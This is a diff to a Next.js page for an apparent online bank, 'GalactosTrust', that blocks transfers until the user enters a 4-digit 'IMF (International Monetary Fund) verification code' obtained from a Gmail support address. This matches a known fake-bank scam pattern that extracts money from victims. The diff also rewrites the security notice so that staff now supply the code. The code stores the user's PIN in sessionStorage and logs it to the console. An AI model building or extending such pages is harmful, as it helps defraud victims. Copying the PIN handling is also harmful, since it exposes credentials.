@@ -1,68 +1,23 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState } from "react"
 import { useRouter } from "next/navigation"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Label } from "@/components/ui/label"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
-import { ShieldAlert, Mail, Clock, ArrowLeft } from "lucide-react"
+import { ShieldAlert, ArrowLeft, AlertCircle } from "lucide-react"
 
 export default function IMFVerificationPage() {
   const router = useRouter()
   const [imfCode, setImfCode] = useState("")
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState("")
-  const [sendingCode, setSendingCode] = useState(false)
-  const [codeSent, setCodeSent] = useState(false)
-  const [timeLeft, setTimeLeft] = useState(900) // 15 minutes in seconds
-
-  useEffect(() => {
-    // Start countdown
-    if (codeSent && timeLeft > 0) {
-      const timer = setInterval(() => {
-        setTimeLeft(prev => prev - 1)
-      }, 1000)
-
-      return () => clearInterval(timer)
-    }
-  }, [codeSent, timeLeft])
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60)
-    const secs = seconds % 60
-    return `${mins}:${secs.toString().padStart(2, '0')}`
-  }
-
-  const handleRequestCode = async () => {
-    setSendingCode(true)
-    setError("")
-
-    try {
-      const response = await fetch('/api/user/generate-imf', {
-        method: 'POST'
-      })
-
-      const data = await response.json()
-
-      if (!response.ok) {
-        setError(data.error || 'Failed to send code')
-        setSendingCode(false)
-        return
-      }
-
-      setCodeSent(true)
-      setTimeLeft(900) // Reset timer
-      setSendingCode(false)
-    } catch {
-      setError('Network error. Please try again.')
-      setSendingCode(false)
-    }
-  }
 
   const handleVerifyCode = async () => {
-    if (!imfCode || imfCode.length !== 6) {
-      setError('Please enter a valid 6-digit code')
+    // Validate input (4 digits)
+    if (!imfCode || imfCode.length !== 4) {
+      setError('Please enter the 4-digit IMF code')
       return
     }
 
@@ -79,21 +34,71 @@ export default function IMFVerificationPage() {
       const data = await response.json()
 
       if (!response.ok) {
-        setError(data.error || 'Invalid code')
+        setError(data.error || 'Invalid IMF code')
         setLoading(false)
         return
       }
 
-      // Code verified successfully - proceed with transfer
-      // Store verification success in sessionStorage
+      // Code verified successfully!
+      console.log('IMF Verified! Now completing the transfer...')
+      
+      // Get the transfer data that was stored (includes PIN)
+      const transferDataStr = sessionStorage.getItem('transferData')
+      
+      if (!transferDataStr) {
+        setError('Transfer data not found. Please try again.')
+        setLoading(false)
+        return
+      }
+
+      const transferData = JSON.parse(transferDataStr)
+      console.log("Transfer data being sent:", transferData)
+      
+      // ✅ FIXED: Now retry the transfer with ALL fields including recipientName and bankName
+      const transferResponse = await fetch('/api/transactions/transfer', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          receiverAccountNumber: transferData.receiverAccountNumber,
+          amount: transferData.amount,
+          description: transferData.description,
+          recipientName: transferData.recipientName, // ✅ NOW INCLUDED
+          bankName: transferData.bankName,           // ✅ NOW INCLUDED
+          pin: transferData.pin, // Use the saved PIN
+          imfVerified: true // Tell API that IMF is verified
+        })
+      })
+
+      const transferResult = await transferResponse.json()
+      console.log("Transfer result:", transferResult)
+
+      if (!transferResponse.ok) {
+        setError(transferResult.error || 'Transfer failed. Please try again.')
+        setLoading(false)
+        return
+      }
+
+      // Transfer successful! Store result and redirect to success page
+      sessionStorage.setItem('transferResult', JSON.stringify(transferResult))
       sessionStorage.setItem('imfVerified', 'true')
       
-      // Redirect back to PIN page to complete transfer
+      console.log('Transfer completed! Redirecting to success page...')
+      
+      // Now redirect to success page
       router.push('/user/transfer/transfer-sucess')
-    } catch {
+      
+    } catch (err) {
+      console.error('Error:', err)
       setError('Network error. Please try again.')
       setLoading(false)
     }
+  }
+
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    // Only allow numbers, max 4 digits
+    const value = e.target.value.replace(/\D/g, '').slice(0, 4)
+    setImfCode(value)
+    setError("") // Clear error on input
   }
 
   return (
@@ -104,7 +109,7 @@ export default function IMFVerificationPage() {
         </div>
         <h1 className="text-2xl font-bold tracking-tight">IMF Verification Required</h1>
         <p className="mt-2 text-muted-foreground">
-          Your account requires additional verification to complete this transaction
+          Your account requires IMF code verification to complete this transaction
         </p>
       </div>
 
@@ -117,89 +122,61 @@ export default function IMFVerificationPage() {
                 Account Restricted
               </p>
               <p className="text-sm text-yellow-700 dark:text-yellow-300 mt-1">
-                Due to security measures, your account requires IMF (International Monetary Fund) 
-                verification code to proceed with transfers.
+                Due to security measures, your account requires an IMF (International Monetary Fund) 
+                verification code to proceed with transfers. Please contact your admin support at support.galactostrustbacorp@gmail.com to obtain this code.
               </p>
             </div>
           </div>
         </CardContent>
       </Card>
 
-      {!codeSent ? (
-        <Card>
-          <CardHeader>
-            <CardTitle>Request Verification Code</CardTitle>
-            <CardDescription>
-              We send a 6-digit code to your registered email address
-            </CardDescription>
-          </CardHeader>
-          <CardContent>
-            <Button
-              onClick={handleRequestCode}
-              className="w-full"
-              disabled={sendingCode}
-            >
-              <Mail className="mr-2 h-4 w-4" />
-              {sendingCode ? "Sending..." : "Send IMF Code to Email"}
-            </Button>
-          </CardContent>
-        </Card>
-      ) : (
-        <Card>
-          <CardHeader>
-            <CardTitle>Enter Verification Code</CardTitle>
-            <CardDescription>
-              Check your email for the 6-digit IMF code
-            </CardDescription>
-          </CardHeader>
-          <CardContent className="space-y-4">
-            {error && (
-              <div className="rounded-lg bg-red-50 p-3 text-sm text-red-600 dark:bg-red-950">
-                {error}
-              </div>
-            )}
-
-            <div className="flex items-center gap-2 rounded-lg bg-blue-50 p-3 dark:bg-blue-950">
-              <Clock className="h-4 w-4 text-blue-600 dark:text-blue-400" />
-              <span className="text-sm text-blue-800 dark:text-blue-200">
-                Code expires in: <strong>{formatTime(timeLeft)}</strong>
-              </span>
+      <Card>
+        <CardHeader>
+          <CardTitle>Enter IMF Code</CardTitle>
+          <CardDescription>
+            Enter the 4-digit code provided by your administrator
+          </CardDescription>
+        </CardHeader>
+        <CardContent className="space-y-4">
+          {error && (
+            <div className="flex items-start gap-2 rounded-lg bg-red-50 p-3 text-sm text-red-600 dark:bg-red-950">
+              <AlertCircle className="h-4 w-4 flex-shrink-0 mt-0.5" />
+              <span>{error}</span>
             </div>
+          )}
 
-            <div className="space-y-2">
-              <Label htmlFor="imfCode">IMF Verification Code</Label>
+          <div className="space-y-2">
+            <Label htmlFor="imfCode">IMF Verification Code</Label>
+            <div className="relative">
+              <div className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground font-mono text-lg">
+                IMF-
+              </div>
               <Input
                 id="imfCode"
                 type="text"
-                placeholder="Enter 6-digit code"
-                maxLength={6}
+                placeholder="0000"
+                maxLength={4}
                 value={imfCode}
-                onChange={(e) => setImfCode(e.target.value.replace(/\D/g, ''))}
-                className="text-center text-2xl tracking-widest"
+                onChange={handleInputChange}
+                className="pl-16 text-center text-2xl tracking-widest font-mono"
                 autoFocus
               />
             </div>
+            <p className="text-xs text-muted-foreground">
+              Enter only the 4 digits (e.g., if code is IMF-8798, enter 8798)
+            </p>
+          </div>
 
-            <div className="flex gap-3">
-              <Button
-                variant="outline"
-                onClick={handleRequestCode}
-                disabled={sendingCode || timeLeft > 0}
-                className="flex-1"
-              >
-                {sendingCode ? "Sending..." : "Resend Code"}
-              </Button>
-              <Button
-                onClick={handleVerifyCode}
-                disabled={loading || imfCode.length !== 6}
-                className="flex-1"
-              >
-                {loading ? "Verifying..." : "Verify & Continue"}
-              </Button>
-            </div>
-          </CardContent>
-        </Card>
-      )}
+          <Button
+            onClick={handleVerifyCode}
+            disabled={loading || imfCode.length !== 4}
+            className="w-full"
+            size="lg"
+          >
+            {loading ? "Verifying..." : "Verify & Continue"}
+          </Button>
+        </CardContent>
+      </Card>
 
       <div className="flex justify-center">
         <Button
@@ -211,11 +188,30 @@ export default function IMFVerificationPage() {
         </Button>
       </div>
 
+      <Card className="border-blue-300 bg-blue-50 dark:bg-blue-950">
+        <CardContent className="pt-6">
+          <div className="flex items-start gap-3">
+            <AlertCircle className="h-5 w-5 text-blue-600 dark:text-blue-400 flex-shrink-0 mt-0.5" />
+            <div className="space-y-2">
+              <p className="text-sm font-medium text-blue-800 dark:text-blue-200">
+                How to get your IMF code:
+              </p>
+              <ul className="text-xs text-blue-700 dark:text-blue-300 space-y-1 list-disc list-inside">
+                <li>Contact your bank support for IMF enquiry</li>
+                <li>Support email at support.galactostrustbacorp@gmail.com</li>
+                <li>Or navigate to menubar and click on support.</li>
+                <li>Enter the 4-digit number portion only</li>
+              </ul>
+            </div>
+          </div>
+        </CardContent>
+      </Card>
+
       <Card className="border-gray-300 bg-gray-50 dark:bg-gray-900">
         <CardContent className="pt-6">
           <p className="text-xs text-gray-700 dark:text-gray-300">
-            <strong>Security Notice:</strong> Never share your IMF code with anyone. 
-            GalactosTrust staff will never ask for this code.
+            <strong>Security Notice:</strong> Never share your account credentials. 
+            GalactosTrust staff will provide the IMF code but will never ask for your password.
           </p>
         </CardContent>
       </Card>
